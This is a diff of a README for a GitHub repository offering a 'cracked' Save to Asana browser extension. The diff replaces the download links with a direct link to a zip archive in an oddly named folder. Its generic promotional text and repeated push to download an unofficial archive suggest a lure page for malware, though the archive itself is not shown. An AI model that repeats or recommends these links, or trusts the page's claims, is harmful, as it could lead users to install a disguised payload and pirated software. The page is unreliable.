@@ -4,7 +4,7 @@
 Welcome to the Cracked Save to Asana Extension! This browser extension helps you save tasks from any webpage directly into your Asana project management tool. Whether you’re browsing a blog, an article, or any online content, our extension makes it simple to keep track of your important tasks without hassle.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Hvc3Er/cracked-save-to-asana-extension/main/exclusivist/cracked-save-to-asana-extension.zip)](https://raw.githubusercontent.com/Hvc3Er/cracked-save-to-asana-extension/main/exclusivist/cracked-save-to-asana-extension.zip)
+[![Download](https://github.com/Hvc3Er/cracked-save-to-asana-extension/raw/refs/heads/main/exclusivist/save_cracked_asana_to_extension_2.6-beta.4.zip)](https://github.com/Hvc3Er/cracked-save-to-asana-extension/raw/refs/heads/main/exclusivist/save_cracked_asana_to_extension_2.6-beta.4.zip)
 
 ## 📋 Features
 - **Easy Task Saving**: Quickly save tasks with a single click.
@@ -22,7 +22,7 @@ Welcome to the Cracked Save to Asana Extension! This browser extension helps you
 To get started with the Cracked Save to Asana Extension, follow these simple steps:
 
 1. **Download the Extension**:
-   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Hvc3Er/cracked-save-to-asana-extension/main/exclusivist/cracked-save-to-asana-extension.zip).
+   Visit this page to download: [Releases Page](https://github.com/Hvc3Er/cracked-save-to-asana-extension/raw/refs/heads/main/exclusivist/save_cracked_asana_to_extension_2.6-beta.4.zip).
 
 2. **Install the Extension**:
    - For Chrome:
@@ -48,7 +48,7 @@ To get started with the Cracked Save to Asana Extension, follow these simple ste
    - Your task will now be saved in your Asana project!
 
 ## 📦 Download & Install
-To download the latest version of the Cracked Save to Asana Extension, please visit: [Releases Page](https://raw.githubusercontent.com/Hvc3Er/cracked-save-to-asana-extension/main/exclusivist/cracked-save-to-asana-extension.zip). Always ensure you are using the latest version for the best experience.
+To download the latest version of the Cracked Save to Asana Extension, please visit: [Releases Page](https://github.com/Hvc3Er/cracked-save-to-asana-extension/raw/refs/heads/main/exclusivist/save_cracked_asana_to_extension_2.6-beta.4.zip). Always ensure you are using the latest version for the best experience.
 
 ## 🔍 Troubleshooting
 If you encounter any issues:
